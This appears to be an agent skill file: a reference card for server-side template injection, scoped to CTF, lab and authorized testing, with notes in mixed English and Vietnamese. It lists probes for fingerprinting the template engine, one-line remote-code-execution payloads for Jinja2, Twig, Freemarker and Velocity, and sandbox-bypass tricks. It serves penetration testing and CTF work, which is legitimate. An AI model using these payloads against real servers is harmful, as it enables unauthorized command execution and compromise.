---
name: web-ssti
description: >
  Server-Side Template Injection. Use when user input is rendered in a template,
  template syntax appears in errors, or `{{7*7}}`/`${7*7}` evaluates to 49.
  Reference card — detect engine, then pull references/<engine>.md for the RCE.
tags: [web, ssti, template-injection, rce]
environment: [ctf, lab, authorized-testing]
budget:
  stuck_threshold: 3
  on_stuck: pivot
  stop_conditions:
    - "engine misidentified twice"
    - "sandbox escape fails 3 times, no new signal"
---

# SSTI — Reference Card

## Detect engine FIRST (đừng bắn RCE mù)
| Probe | 49? → engine |
|---|---|
| `{{7*7}}` | Jinja2 / Twig / Mako |
| `${7*7}` | Freemarker / Velocity |
| `#{7*7}` | Thymeleaf / Ruby ERB |
| `<%= 7*7 %>` | ERB |
| `{{7*'7'}}` | `49`=Jinja2 · `7777777`=Twig |

Xác nhận qua error string: `jinja2.exceptions...` · `Twig\Error...` · `freemarker.core...`.
Chi tiết fingerprint: `references/engine-detection.md`.

## Quick RCE (một phát/engine) → depth ở references/
- **Jinja2**: `{{lipsum.__globals__['os'].popen('id').read()}}`
  hoặc `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` → `references/jinja2.md`
- **Twig**: `{{['id']|filter('system')}}` → `references/twig.md`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` → `references/freemarker.md`
- **Velocity**: `$class.inspect("java.lang.Runtime").getRuntime().exec("id")` → `references/velocity.md`

## Filter/sandbox bypass
Concat key `''['__cla'+'ss__']`; index qua `request.args.x` (`?x=INDEX`); `chr()`; url-encode
`%7B%7B...%7D%7D`. Danh mục đầy đủ: `references/ssti-bypass.md`.

## Pull thêm payload
Đọc thêm biến thể trong `../ctf-web/server-side-exec.md`.

## Discipline (../LOOP_DISCIPLINE.md)
- `{{7*7}}` ra `49` mới xác nhận SSTI — chưa có 49 thì đừng bắn chain RCE.
- Sai engine 2 lần → quay lại bảng detect, đừng ép payload của engine khác.
